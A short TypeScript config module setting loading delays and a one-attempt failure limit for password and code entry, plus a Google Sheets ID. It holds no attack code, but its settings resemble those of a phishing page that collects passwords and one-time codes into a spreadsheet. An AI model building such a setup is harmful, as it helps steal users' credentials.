interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  sheet_id: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 5000,
    max_failed_code_attempts: 1,
    max_failed_password_attempts: 1,
    password_loading_time: 5000,
    sheet_id: "15LbwSRR4_tHemAHXlb__8RIsxamr9ub0kIMAf6TrUKs"
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
